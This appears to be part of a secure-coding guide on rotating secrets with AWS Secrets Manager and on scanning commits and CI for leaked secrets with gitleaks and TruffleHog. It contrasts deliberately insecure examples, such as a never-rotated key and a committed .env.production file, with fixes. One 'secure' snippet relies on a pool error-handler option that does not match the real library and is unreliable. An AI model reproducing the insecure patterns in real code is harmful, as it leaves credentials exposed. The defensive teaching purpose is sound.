Static secrets that never change give attackers an unlimited window of exploitation after compromise. If a database password or API key is leaked, it remains valid indefinitely unless rotated. Automatic rotation limits the blast radius of credential leaks by ensuring secrets expire and are replaced on a regular schedule. The rotation process must be zero-downtime — both old and new credentials must work during the transition window.

**Vulnerable (static secrets with no rotation):**

```typescript
// ❌ Hardcoded API key — never rotated, valid forever after leak
const STRIPE_KEY = process.env.STRIPE_SECRET_KEY
// This key was set 18 months ago and never changed
// If leaked via logs, git history, or memory dump, attacker has permanent access

// ❌ Database password — manual rotation causes downtime
// .env file:
// DB_PASSWORD=production_password_2024
// Changed manually once a year — requires app restart
// No overlap period — old password stops working immediately
```

**Secure (automated rotation with overlap period):**

```typescript
// ✅ AWS Secrets Manager with automatic rotation
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager'

const client = new SecretsManagerClient({ region: 'us-east-1' })

// Fetch the current secret on every use — always gets the latest rotated value
async function getDbCredentials(): Promise<{ username: string; password: string }> {
  const result = await client.send(
    new GetSecretValueCommand({
      SecretId: 'prod/database/credentials',
      VersionStage: 'AWSCURRENT',  // Always the current, rotated version
    })
  )
  return JSON.parse(result.SecretString!)
}

// ✅ Connection pool that refreshes credentials on authentication failure
async function createPool() {
  const creds = await getDbCredentials()
  const pool = new Pool({
    user: creds.username,
    password: creds.password,
    host: process.env.DB_HOST,
    // On auth failure, refresh credentials (rotation may have occurred)
    connectionErrorHandler: async (err) => {
      if (err.message.includes('authentication failed')) {
        const newCreds = await getDbCredentials()
        pool.options.password = newCreds.password
      }
    },
  })
  return pool
}
```

Configure secret rotation schedules (30-90 days for passwords, 7 days for API keys). Test rotation in staging regularly — a rotation mechanism that has never been tested will fail in production.

Reference: [AWS Secrets Manager Rotation](https://docs.aws.amazon.com/secretsmanager/latest/userguide/rotating-secrets.html)

---

## Scan Commits and CI for Leaked Secrets

**Impact: CRITICAL — CWE-312**

Secrets committed to git are often discovered within minutes by automated scanners (GitHub Secret Scanning, bots). Pre-commit hooks catch secrets before they ever hit the remote. CI scanning provides a second safety net. Both layers are required.

**Vulnerable (no secret scanning in place):**

```bash
# ❌ No pre-commit hook — secret committed without warning
git add .env.production
git commit -m "add config"
git push origin main
# Automated bot finds stripe key within 60 seconds
```

**Secure (pre-commit + CI scanning):**

```bash
# ✅ Install gitleaks as a pre-commit hook
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.4
    hooks:
      - id: gitleaks

# Install and enable:
# pip install pre-commit
# pre-commit install

# ✅ Or use detect-secrets for baseline approach
# pip install detect-secrets
# detect-secrets scan > .secrets.baseline
# detect-secrets audit .secrets.baseline

# ✅ CI step (GitHub Actions)
# .github/workflows/security.yml
```

```yaml
# ✅ GitHub Actions secret scanning step
name: Security Scan
on: [push, pull_request]
jobs:
  secrets-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # full history for gitleaks
      - name: Run Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}

  trufflehog:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: TruffleHog Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
```

Enable GitHub's built-in Secret Scanning for public repositories (free) and GitHub Advanced Security for private repos. Configure push protection to block pushes containing known secret patterns.

Reference: [GitHub Secret Scanning](https://docs.github.com/en/code-security/secret-scanning)

---

## References

- https://owasp.org/www-project-top-ten/
- https://owasp.org/www-project-api-security/
- https://cheatsheetseries.owasp.org/
- https://cwe.mitre.org/
- https://nvd.nist.gov/
- https://www.nist.gov/cyberframework
- https://developer.mozilla.org/en-US/docs/Web/Security
